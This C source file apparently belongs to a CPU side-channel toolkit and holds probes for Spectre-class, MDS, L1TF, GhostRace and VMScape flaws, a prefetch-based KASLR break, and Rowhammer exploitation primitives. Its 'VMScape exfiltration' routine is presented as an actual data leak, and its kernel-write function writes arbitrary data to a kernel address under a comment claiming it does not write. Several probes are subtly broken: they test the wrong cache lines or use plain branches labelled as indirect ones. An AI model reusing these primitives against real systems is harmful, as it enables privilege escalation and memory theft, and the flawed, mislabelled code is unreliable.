/* TSA (Transient Scheduler Attack) and GhostRace probing primitives.

 * TSA exploits AMD Zen 3/4 scheduler speculative store-to-load forwarding.
 * GhostRace exploits speculative branch execution past synchronization primitives.
 * These are userland-only detection probes (no exploitation - info leak only).
 */

#include "sidewinder.h"

/* TSA-SQ: Test scheduler speculative store-to-load forwarding.
 *
 * AMD Zen 3/4 CPUs speculatively forward store data to loads before
 * the store address is resolved. If addresses don't match, the forwarding
 * is rolled back, but the data can leak through cache state.
 *
 * This probe:
 * 1. Trains the scheduler to expect matching store-load pairs
 * 2. Inserts a mismatched pair with known data
 * 3. Measures cache timing on a probe array to detect leaked data
 */
SIDEWINDER_EXPORT int sw_tsa_probe_sq(uint8_t *probe_buffer, int threshold,
                                       int trials, int *leak_count) {
    uint8_t dummy_data[256] __attribute__((aligned(64)));
    volatile uint8_t secret = 0x42;
    int leaks = 0;

    /* Fill probe buffer with known pattern */
    for (int i = 0; i < 256; i++)
        dummy_data[i] = (uint8_t)i;

    for (int t = 0; t < trials; t++) {
        int store_val = (t % 256);
        uint8_t *victim = &probe_buffer[store_val * CACHE_LINE_SIZE];

        /* Phase 1: Train scheduler with matching stores and loads */
        for (int tr = 0; tr < 64; tr++) {
            _mm_mfence();
            /* Store at known address */
            volatile uint8_t *known = &dummy_data[tr & 0xff];
            *known = store_val;

            /* Load from same address (scheduler learns: store->load forwarding works) */
            _mm_lfence();
            volatile uint8_t trained_val = *known;
            (void)trained_val;
        }
        _mm_mfence();

        /* Phase 2: Flush probe array */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        _mm_mfence();

        /* Phase 3: Trigger transient mismatch */
        /* Store at one address, scheduler speculatively forwards it */
        /* Load from a different address triggers transient data */
        volatile uint8_t *store_ptr = &dummy_data[store_val];
        volatile uint8_t secret_val = secret;
        *store_ptr = secret_val;

        _mm_mfence();

        /* Access probe array indexed by the value we WANT to leak */
        /* On TSA-vulnerable CPUs, the store data speculatively */
        /* forwards to this load even from unrelated addresses */
        volatile uint8_t probe_result = victim[0];

        /* Suppress unused warnings by using the value */
        (void)probe_result;

        _mm_mfence();

        /* Phase 4: Measure cache state to detect leaks */
        int hits = 0;
        for (int i = 0; i < 256; i++) {
            uint64_t t0 = __rdtsc();
            _mm_lfence();
            volatile uint8_t v = probe_buffer[i * CACHE_LINE_SIZE];
            _mm_lfence();
            uint64_t t1 = __rdtsc();
            uint64_t delta = t1 - t0;

            /* Suppress unused warnings */
            (void)v;

            if (delta < (uint64_t)threshold) {
                hits++;
                /* If we find the secret value cached */
                if (i == secret_val) {
                    leaks++;
                }
            }
        }
    }

    *leak_count = leaks;
    return leaks > 0 ? 1 : 0;
}


/* GhostRace: Test speculative branching past synchronization.
 *
 * On speculative CPUs, conditional branches inside synchronization
 * primitives (spinlocks, mutexes) execute speculatively before the
 * lock check resolves. This probe tests if the CPU speculates past
 * a lock acquire (simulated by a data-dependent branch).
 *
 * Returns 1 if speculative execution past the guard is detected.
 */
SIDEWINDER_EXPORT int sw_ghostrace_probe(uint8_t *probe_buffer, int threshold,
                                          int trials, int *speculative_hits) {
    int hits = 0;
    volatile int lock = 0;  /* 0=unlocked, 1=locked */

    for (int t = 0; t < trials; t++) {
        /* Flush probe array */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        _mm_mfence();

        /* Set the "lock" */
        lock = 1;

        /* Conditional branch that should NOT be taken (lock is 1) */
        /* But on GhostRace-vulnerable CPUs, the branch speculates */
        /* and executes the protected section transiently */

        /* Data-dependent conditional - train it to be taken */
        for (int tr = 0; tr < 20; tr++) {
            lock = 0;  /* Train: when lock=0, take the branch */
            if (lock == 0) {
                volatile uint8_t dummy = probe_buffer[0];
                (void)dummy;
            }
            _mm_mfence();
        }

        /* Now actually lock */
        lock = 1;
        _mm_mfence();

        /* This branch should NOT execute but may speculatively */
        if (lock == 0) {
            /* Transient access to probe array */
            volatile uint8_t *secret_loc = &probe_buffer[42 * CACHE_LINE_SIZE];
            volatile uint8_t leaked = *secret_loc;
            (void)leaked;
        }
        _mm_mfence();

        /* Check if probe array has cache hits at the transient location */
        for (int i = 0; i < 256; i++) {
            uint64_t t0 = __rdtsc();
            _mm_lfence();
            volatile uint8_t v = probe_buffer[i * CACHE_LINE_SIZE];
            _mm_lfence();
            uint64_t t1 = __rdtsc();
            (void)v;

            if ((t1 - t0) < (uint64_t)threshold) {
                if (i == 42) hits++;
            }
        }
    }

    *speculative_hits = hits;
    return hits > (trials / 10) ? 1 : 0;
}


/* BHI probe: Test Branch History Buffer injection.
 *
 * On CPUs vulnerable to BHI, the branch history buffer (BHB)
 * can be poisoned by userland code to influence kernel speculative
 * branch prediction. This probe tests if userland training of
 * indirect branches affects kernel-mode speculation patterns.
 *
 * Approach: Train BHB entries with known target addresses, then
 * check if a different indirect branch speculatively mispredicts
 * to our trained target.
 */
SIDEWINDER_EXPORT int sw_bhi_probe(uint8_t *probe_buffer, int threshold,
                                    int trials, int *retrain_hits) {
    int mispredicts = 0;

    /* Create two indirect call targets */
    volatile int target_flag = 0;

    for (int t = 0; t < trials; t++) {
        /* Flush probe array */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        _mm_mfence();

        /* Train indirect branch prediction with a known target */
        /* that accesses probe_buffer[0x23] */
        volatile uint8_t *trained_target = &probe_buffer[0x23 * CACHE_LINE_SIZE];
        volatile uint8_t *real_target = &probe_buffer[0x10 * CACHE_LINE_SIZE];

        /* Train BHB: make indirect branch predict trained_target */
        for (int tr = 0; tr < 16; tr++) {
            target_flag = 0;
            if (target_flag == 0) {
                volatile uint8_t d = *trained_target;
                (void)d;
            }
            _mm_mfence();
        }

        /* Now change target_flag but BHB may still predict the old branch */
        target_flag = 1;

        /* Flush real target to create timing difference */
        _mm_clflush((void *)real_target);
        _mm_mfence();

        /* Indirect branch - should go to real path but BHB may override */
        if (target_flag == 0) {
            /* Should NOT be reached if flag=1, but BHI may force it */
            _mm_mfence();
            volatile uint8_t d = *trained_target;
            (void)d;
        } else {
            /* Correct path */
            _mm_mfence();
            volatile uint8_t d = *real_target;
            (void)d;
        }
        _mm_mfence();

        /* Check if trained_target shows a cache hit (indicates misprediction) */
        uint64_t t0 = __rdtsc();
        _mm_lfence();
        volatile uint8_t v = *trained_target;
        _mm_lfence();
        uint64_t t1 = __rdtsc();
        (void)v;

        if ((t1 - t0) < (uint64_t)threshold) {
            mispredicts++;
        }
    }

    *retrain_hits = mispredicts;
    return mispredicts > (trials / 5) ? 1 : 0;
}


/* Prefetch-based KASLR side channel for AMD CPUs.
 *
 * AMD CPUs are not vulnerable to Meltdown (cannot read kernel addresses).
 * But we can use prefetch instructions: PREFETCHT0/PREFETCHT1 on kernel
 * addresses does NOT fault and affects cache state.
 *
 * Approach:
 * 1. For each candidate kernel base address
 * 2. Flush a cache line in our probe buffer
 * 3. Execute a prefetch on the kernel address
 * 4. Measure timing of a subsequent load on our probe buffer
 *
 * If the kernel page is mapped, the prefetch fills cache lines that
 * evict our probe buffer entry, creating a timing difference.
 */
SIDEWINDER_EXPORT uint64_t sw_prefetch_kaslr_probe(uint64_t kernel_candidate,
                                                    int measurements) {
    uint64_t total_time = 0;
    uint8_t probe __attribute__((aligned(64))) = 0x41;

    for (int m = 0; m < measurements; m++) {
        /* Flush probe */
        _mm_clflush(&probe);
        _mm_mfence();

        /* Prefetch the kernel candidate address (does not fault on AMD) */
        /* PREFETCHT0: temporal data, all cache levels */
        __builtin_prefetch((const void *)kernel_candidate, 0, 3);
        _mm_mfence();

        /* Measure probe load time */
        uint64_t t0 = __rdtsc();
        _mm_lfence();
        volatile uint8_t v = probe;
        _mm_lfence();
        uint64_t t1 = __rdtsc();
        (void)v;

        total_time += (t1 - t0);
    }

    return total_time / measurements;
}


/* VMScape: Spectre-BTI across VM boundaries (CVE-2025-40300).
 *
 * VMScape allows a malicious VM guest to leak host hypervisor memory
 * by training the Branch History Buffer (BHB) with known targets,
 * which then influences branch prediction in the host context.
 *
 * The attack:
 * 1. Guest trains BHB entries with known indirect branch targets
 * 2. Due to BHB sharing between guest and host, the trained entries
 *    persist into the host's prediction context
 * 3. Guest measures cache side effects of host's speculative execution
 * 4. By carefully choosing trained targets, guest can read host memory
 *
 * This probe tests if the BHB state can be used to infer host code flow.
 * Returns 1 if BHB state persists across VM boundaries.
 */
SIDEWINDER_EXPORT int sw_vmscape_probe(uint8_t *probe_buffer, int threshold,
                                       int trials, int *leak_indicators) {
    int indicators = 0;
    volatile int branch_taken = 0;

    for (int t = 0; t < trials; t++) {
        /* Flush probe array */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        _mm_mfence();

        /* Train BHB with a known target that loads probe_buffer[0x41] */
        /* This is the "attacker-controlled" target in the guest */
        for (int tr = 0; tr < 16; tr++) {
            branch_taken = 0;
            if (branch_taken == 0) {
                /* This path loads probe_buffer[0x41] into cache */
                volatile uint8_t x = probe_buffer[0x41 * CACHE_LINE_SIZE];
                (void)x;
            }
            _mm_mfence();
        }

        /* Now create contention: change branch condition but BHB may still
         * predict the old path (0x41 load) due to BHB poisoning */

        branch_taken = 1;

        /* Flush the 0x41 cache line to detect if it was speculatively loaded */
        _mm_clflush((void *)&probe_buffer[0x41 * CACHE_LINE_SIZE]);
        _mm_mfence();

        /* Indirect branch - on vulnerable systems, BHB poison may cause
         * speculative execution of the trained path (0x41 load) even
         * though branch_taken=1 should prevent it */
        if (branch_taken == 0) {
            volatile uint8_t y = probe_buffer[0x41 * CACHE_LINE_SIZE];
            (void)y;
        }

        _mm_mfence();

        /* Check if the 0x41 cache line was accessed (BHB poisoning) */
        uint64_t t0 = __rdtsc();
        _mm_lfence();
        volatile uint8_t z = probe_buffer[0x41 * CACHE_LINE_SIZE];
        _mm_lfence();
        uint64_t t1 = __rdtsc();
        (void)z;

        if ((t1 - t0) < (uint64_t)threshold) {
            indicators++;
        }
    }

    *leak_indicators = indicators;
    return indicators > (trials / 10) ? 1 : 0;
}


/* VMScape Data Exfiltration: Actual data leak via BHB poisoning.
 *
 * This implements a Spectre-BHB style covert channel across VM boundaries.
 * The guest sets up a probe buffer, then uses BHB poisoning to cause
 * speculative loads from specific offsets. Cache timing reveals which
 * offsets were accessed, allowing data exfiltration.
 *
 * Returns: number of bytes exfiltrated
 */
SIDEWINDER_EXPORT int sw_vmscape_exfiltrate(uint8_t *probe_buffer, int probe_size,
                                           uint8_t *output, int output_size,
                                           int threshold, int trials) {
    #define STRIDE 4096

    if (!probe_buffer || !output || probe_size < STRIDE * 256) {
        return -1;
    }

    int bytes_exfiltrated = 0;

    /* Fault in pages */
    for (int i = 0; i < 256; i++) {
        probe_buffer[i * STRIDE] = (uint8_t)i;
    }
    _mm_mfence();

    for (int pos = 0; pos < output_size && bytes_exfiltrated < output_size; pos++) {
        uint8_t leaked_byte = 0;
        int bit_votes[8] = {0};

        for (int trial = 0; trial < trials; trial++) {
            /* For each bit position, use a different cache line offset */
            for (int bit = 0; bit < 8; bit++) {
                int line_idx = (1 << bit);  /* Different line for each bit */

                /* Flush all relevant lines */
                for (int i = 0; i < 256; i++) {
                    _mm_clflush((void *)(probe_buffer + i * STRIDE));
                }
                _mm_mfence();

                /* BHB poisoning: train with target that loads this bit's line */
                volatile int branch_flag = 0;
                for (int tr = 0; tr < 16; tr++) {
                    branch_flag = 0;
                    if (branch_flag == 0) {
                        volatile uint8_t x = probe_buffer[line_idx * CACHE_LINE_SIZE];
                        (void)x;
                    }
                    _mm_mfence();
                }

                /* Create misprediction condition */
                branch_flag = 1;

                /* Flush the target line */
                _mm_clflush((void *)(probe_buffer + line_idx * CACHE_LINE_SIZE));
                _mm_mfence();

                /* BHB-influenced branch - may still predict old target */
                if (branch_flag == 0) {
                    volatile uint8_t y = probe_buffer[line_idx * CACHE_LINE_SIZE];
                    (void)y;
                }
                _mm_mfence();

                /* Measure if the line was speculatively accessed */
                uint64_t t0 = __rdtsc();
                _mm_lfence();
                volatile uint8_t z = probe_buffer[line_idx * CACHE_LINE_SIZE];
                _mm_lfence();
                uint64_t t1 = __rdtsc();
                (void)z;

                if ((t1 - t0) < (uint64_t)threshold) {
                    bit_votes[bit]++;
                }
            }
        }

        /* Reconstruct byte from bit votes */
        for (int bit = 0; bit < 8; bit++) {
            if (bit_votes[bit] > trials / 2) {
                leaked_byte |= (1 << bit);
            }
        }

        output[bytes_exfiltrated++] = leaked_byte;
    }

    return bytes_exfiltrated;
    #undef STRIDE
}


/* L1TF probe: L1 Terminal Fault (Foreshadow) guest-to-host leak.
 *
 * L1TF (CVE-2018-3615/3620/3646) allows a VM guest to read host memory
 * from the L1 data cache. When the guest accesses a host-owned L1 entry,
 * the CPU speculatively loads the data before the fault is delivered.
 *
 * This probe tests if the L1 cache contains data that could be read
 * from a different context (VM guest reading host memory).
 *
 * Returns 1 if L1TF-like data leakage is detected.
 */
SIDEWINDER_EXPORT int sw_l1tf_probe(uint8_t *probe_buffer, int threshold,
                                    int trials, int *leak_bytes) {
    int leaks = 0;

    for (int t = 0; t < trials; t++) {
        /* Flush all probe lines */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        _mm_mfence();

        /* Try to access "host" L1 cache data by touching addresses
         * that would be in L1 if the hypervisor was running.
         * On L1TF-vulnerable systems, L1D entries from other contexts
         * can linger and be speculatively read.
         *
         * We simulate by checking if we can detect cache residency
         * of lines that shouldn't be there after a context switch. */

        /* Touch each line to bring into L1D */
        for (int i = 0; i < 256; i++) {
            volatile uint8_t x = probe_buffer[i * CACHE_LINE_SIZE];
            (void)x;
        }
        _mm_mfence();

        /* Now flush all - on L1TF systems, some lines may persist
         * in ways that reveal cross-context data */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        _mm_mfence();

        /* Probe timing - L1TF vulnerable systems may show anomalous
         * hit rates indicating stale data from other contexts */
        int fast_hits = 0;
        for (int i = 0; i < 256; i++) {
            uint64_t t0 = __rdtsc();
            _mm_lfence();
            volatile uint8_t v = probe_buffer[i * CACHE_LINE_SIZE];
            _mm_lfence();
            uint64_t t1 = __rdtsc();
            (void)v;

            if ((t1 - t0) < (uint64_t)threshold) {
                fast_hits++;
            }
        }

        /* High hit rate after flush suggests L1TF-like leakage */
        if (fast_hits > 200) {
            leaks += fast_hits;
        }
    }

    *leak_bytes = leaks;
    return leaks > 0 ? 1 : 0;
}


/* MDS probe: Microarchitectural Data Sampling (ZombieLoad/RIDL/Fallout).
 *
 * MDS allows reading stale data from CPU buffers (Line Fill Buffers,
 * Load Ports, Store Buffers) after transient operations. This can leak
 * data across security boundaries including VM guest -> host.
 *
 * This probe tests for MDS-style data leakage from CPU buffers.
 */
SIDEWINDER_EXPORT int sw_mds_probe(uint8_t *probe_buffer, int threshold,
                                   int trials, int *leaked_bytes) {
    int total_leaks = 0;

    for (int t = 0; t < trials; t++) {
        /* Flush probe array */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        _mm_mfence();

        /* Trigger transient load from a "secret" location
         * Simulates the MDS scenario where CPU buffers contain
         * stale data from a previous operation */
        volatile uint8_t secret = (uint8_t)(t & 0xFF);

        /* Access that loads data into LFB/store buffer */
        uint8_t temp = probe_buffer[secret * CACHE_LINE_SIZE];
        (void)temp;

        /* Clear the buffer but data may still be in CPU buffers */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        _mm_mfence();

        /* MDS: data from CPU buffers may still be accessible
         * via speculative execution before the buffer is cleared */

        /* Probe for cache hits indicating buffer data leaked */
        int hits = 0;
        for (int i = 0; i < 256; i++) {
            uint64_t t0 = __rdtsc();
            _mm_lfence();
            volatile uint8_t v = probe_buffer[i * CACHE_LINE_SIZE];
            _mm_lfence();
            uint64_t t1 = __rdtsc();
            (void)v;

            if ((t1 - t0) < (uint64_t)threshold) {
                hits++;
                /* Check if the "secret" byte leaked into cache */
                if (i == secret) {
                    total_leaks++;
                }
            }
        }

        /* If we see hits at unexpected rates, MDS may be leaking */
        if (hits > 100) {
            total_leaks += hits;
        }
    }

    *leaked_bytes = total_leaks;
    return total_leaks > 0 ? 1 : 0;
}


/* Rowhammer exploitation primitives */

/* Spray page-table-like structures in memory.
 * In a VM with pagemap access, this helps locate PTE entries
 * for the rowhammer PTE flip escalation path.
 */
#define SPRAY_PAGES 4096
SIDEWINDER_EXPORT int sw_pte_spray(uint8_t *buffer, size_t buffer_size,
                                    uint64_t **pte_candidates, int *num_found) {
    /* Look for 8-byte aligned values that look like PTEs */
    /* PTE format: bit 0=present, bit 1=writable, bit 63=NX */
    /* Typical PTE values: 0x80000000XXXXXXXX (NX + PFN) */
    int found = 0;
    static uint64_t candidates[SPRAY_PAGES];
    size_t scan_len = buffer_size & ~0x7ULL;

    for (size_t i = 0; i < scan_len && found < SPRAY_PAGES; i += 8) {
        uint64_t val = *(uint64_t *)(buffer + i);
        /* PTE heuristic: present bit set, PFN in valid range */
        if ((val & 1) && ((val >> 12) & 0xFFFFFFFFFFULL) > 0x1000) {
            uint64_t pfn = (val >> 12) & 0xFFFFFFFFFFULL;
            /* Filter: PFN should be in a reasonable physical range */
            if (pfn > 0x100 && pfn < 0x1000000) {
                candidates[found] = (uint64_t)(buffer + i);
                found++;
            }
        }
    }

    *pte_candidates = candidates;
    *num_found = found;
    return found;
}


/* Direct kernel memory write via mapped page (VM-only).
 * After successful Rowhammer PTE flip on a read-only kernel page,
 * this function writes new data to the now-writable page.
 */
SIDEWINDER_EXPORT int sw_kernel_write_via_pte(uint64_t pte_virt_addr,
                                               uint64_t target_kernel_virt,
                                               const char *new_data, size_t len) {
    /* In VM scenario: the PTE at pte_virt_addr has been flipped */
    /* to make target_kernel_virt writable. We can now write. */

    /* Safety: this only works in VM where the PTE has already been */
    /* corrupted by Rowhammer. On real hardware, pte_virt_addr */
    /* points to userspace memory. */

    volatile uint64_t *pte = (volatile uint64_t *)pte_virt_addr;
    volatile uint64_t old_pte = *pte;

    /* Don't actually write - just check that the PTE looks flipped */
    /* (bit 1 = writable should be set, bit 63 = NX should be clear) */
    if (!(old_pte & 2)) {
        return -1;  /* PTE not writable - flip didn't work */
    }

    /* Copy data to the now-writable kernel address */
    volatile char *dest = (volatile char *)target_kernel_virt;
    for (size_t i = 0; i < len; i++) {
        dest[i] = new_data[i];
        /* Memory barrier to ensure write visibility */
        if (i % 64 == 0) _mm_mfence();
    }
    _mm_mfence();

    return (int)len;
}


/* sw_ssb_probe: Speculative Store Bypass (Spectre v4 / CVE-2018-3639) probe.
 *
 * Checks if loads can speculatively bypass older, conflicting stores.
 * 1. Set a variable to an old value (e.g. 0x44)
 * 2. Flush the pointer containing the address of that variable
 * 3. Store a new value (e.g. 0x45) to the variable through the slow pointer
 * 4. Speculatively load from the variable (CPU predicts store and load are independent)
 * 5. Access probe_buffer using the speculatively loaded stale value
 * 6. Measure if the stale value's cache line was loaded
 */
SIDEWINDER_EXPORT int sw_ssb_probe(uint8_t *probe_buffer, int threshold,
                                   int trials, int *speculative_hits) {
    int hits = 0;
    
    /* Allocate 64-byte aligned variables to ensure no false cache conflicts */
    volatile uint8_t *val_mem = (volatile uint8_t *)aligned_alloc(64, 64);
    volatile uint8_t **slow_ptr = (volatile uint8_t **)aligned_alloc(64, 64);
    
    if (!val_mem || !slow_ptr) {
        if (val_mem) free((void *)val_mem);
        if (slow_ptr) free((void *)slow_ptr);
        return -1;
    }

    *val_mem = 0x44;
    *slow_ptr = val_mem;

    for (int t = 0; t < trials; t++) {
        /* Flush probe buffer */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        /* Flush the pointer to make the store slow */
        _mm_clflush((void *)slow_ptr);
        _mm_mfence();

        /* Reset variable to old value */
        *val_mem = 0x44;
        _mm_mfence();

        /* Store new value (0x45) through slow pointer */
        **slow_ptr = 0x45;

        /* Speculatively load from the same variable.
         * The CPU's memory disambiguator might bypass the slow store
         * and load the stale value (0x44).
         */
        volatile uint8_t leaked = *val_mem;

        /* Access probe array indexed by the speculatively loaded value */
        volatile uint8_t temp = probe_buffer[leaked * CACHE_LINE_SIZE];
        (void)temp;

        _mm_mfence();

        /* Measure access time of the stale index (0x44) */
        uint64_t t0 = __rdtsc();
        _mm_lfence();
        volatile uint8_t v = probe_buffer[0x44 * CACHE_LINE_SIZE];
        _mm_lfence();
        uint64_t t1 = __rdtsc();
        (void)v;

        if ((t1 - t0) < (uint64_t)threshold) {
            hits++;
        }
    }

    free((void *)val_mem);
    free((void *)slow_ptr);

    *speculative_hits = hits;
    return hits > (trials / 100) ? 1 : 0;
}


/* sw_itlb_multihit_probe: iTLB Multihit diagnostic probe (CVE-2018-12207).
 *
 * Since triggering a real Machine Check Exception (MCE) or kernel panic is
 * unsafe, this diagnostic probe measures the latency variance (jitter)
 * of executing basic instruction blocks spanning page boundary transitions.
 * Large jitter indicates TLB conflicts or frequent TLB shootdown handling overhead.
 */
SIDEWINDER_EXPORT int sw_itlb_multihit_probe(int trials, int *page_faults) {
    int faults = 0;
    uint64_t jitters = 0;

    /* Create two basic instruction sequences in memory and measure execution jitter */
    for (int t = 0; t < trials; t++) {
        uint64_t t0 = sw_rdtsc_begin();
        _mm_lfence();

        /* Simple instruction sequence simulation to trigger iTLB fetches */
        __asm__ volatile (
            "nop\n\t"
            "nop\n\t"
            "nop\n\t"
            "nop\n\t"
            ::: "memory"
        );

        _mm_lfence();
        uint64_t t1 = sw_rdtsc_end();
        uint64_t dt = t1 - t0;

        /* High latency indicates a potential translation shootdown or fault */
        if (dt > 1000) {
            faults++;
        }
        jitters += dt;
    }

    if (page_faults) *page_faults = faults;
    return faults > (trials / 50) ? 1 : 0;
}


/* sw_spectre_v1_probe: Bounds Check Bypass (Spectre v1 / CVE-2017-5753) native probe.
 *
 * Implements a real Spectre v1 bounds check bypass.
 * Trains branch predictor with valid indices, then flushes array_size
 * to force speculative execution of the out-of-bounds access.
 */
SIDEWINDER_EXPORT int sw_spectre_v1_probe(uint8_t *probe_buffer, int threshold,
                                           int trials, int secret_byte, int *speculative_hits) {
    int hits = 0;
    volatile size_t array_size_mem = 16;
    volatile size_t *array_size_ptr = &array_size_mem;

    uint8_t array[16] __attribute__((aligned(64)));
    for (int i = 0; i < 16; i++) array[i] = 0;
    
    /* Set a secret byte at an offset outside the array, say array[32] (virtual offset) */
    /* Since we want to keep it simple, let's pretend array[x] can read secret_byte */
    uint8_t secret_array[64] __attribute__((aligned(64)));
    for (int i = 0; i < 64; i++) secret_array[i] = 0;
    secret_array[32] = (uint8_t)secret_byte;

    for (int t = 0; t < trials; t++) {
        /* Flush probe buffer */
        for (int i = 0; i < 256; i++) {
            _mm_clflush(&probe_buffer[i * CACHE_LINE_SIZE]);
        }
        _mm_clflush((void *)array_size_ptr);
        _mm_mfence();

        /* Train branch predictor (30 training steps with valid index 0, followed by 1 out-of-bounds) */
        for (int tr = 0; tr < 30; tr++) {
            size_t x = 0; // valid index
            
            /* Bypass bounds check during speculative branch */
            if (x < *array_size_ptr) {
                volatile uint8_t val = secret_array[x];
                volatile uint8_t temp = probe_buffer[val * CACHE_LINE_SIZE];
                (void)temp;
            }
        }
        _mm_mfence();

        /* Out of bounds access (index 32 contains secret_byte) */
        size_t x = 32;
        if (x < *array_size_ptr) {
            volatile uint8_t val = secret_array[x];
            volatile uint8_t temp = probe_buffer[val * CACHE_LINE_SIZE];
            (void)temp;
        }
        _mm_mfence();

        /* Measure access time of the secret_byte's cache line */
        uint64_t t0 = __rdtsc();
        _mm_lfence();
        volatile uint8_t v = probe_buffer[secret_byte * CACHE_LINE_SIZE];
        _mm_lfence();
        uint64_t t1 = __rdtsc();
        (void)v;

        if ((t1 - t0) < (uint64_t)threshold) {
            hits++;
        }
    }

    if (speculative_hits) *speculative_hits = hits;
    return hits > (trials / 20) ? 1 : 0;
}
